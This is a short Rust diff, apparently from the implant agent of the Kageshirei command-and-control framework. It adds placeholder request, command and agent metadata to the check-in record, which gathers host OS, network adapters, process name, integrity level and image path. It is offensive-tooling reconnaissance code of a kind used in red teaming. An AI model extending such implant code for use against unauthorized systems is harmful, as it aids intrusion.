@@ -1,6 +1,7 @@
+use alloc::sync::Arc;
 use core::{ffi::c_void, fmt::Write as _};
 
-use kageshirei_communication_protocol::{communication::Checkin, NetworkInterface};
+use kageshirei_communication_protocol::{communication::Checkin, Metadata, NetworkInterface};
 use mod_agentcore::instance_mut;
 use mod_win32::{
     nt_get_adapters_info::get_adapters_info,
@@ -62,6 +63,13 @@ pub fn initialize_checkin_data() {
 
         // Create a list of NetworkInterface object from the gathered IP addresses
 
+        let metadata = Metadata {
+            request_id: "request_id".to_string(),
+            command_id: "checkin".to_string(),
+            agent_id:   "agent_id".to_string(),
+            path:       None,
+        };
+
         // Create a Checkin object with the gathered metadata
         let checkin = Box::new(Checkin {
             operative_system: operating_system,
@@ -74,7 +82,7 @@ pub fn initialize_checkin_data() {
             process_name: get_process_name(),
             integrity_level: rid,
             cwd: get_image_path_name(),
-            metadata: None,
+            metadata: Some(Arc::new(metadata)),
         });
 
         // Set the Checkin data in the global instance
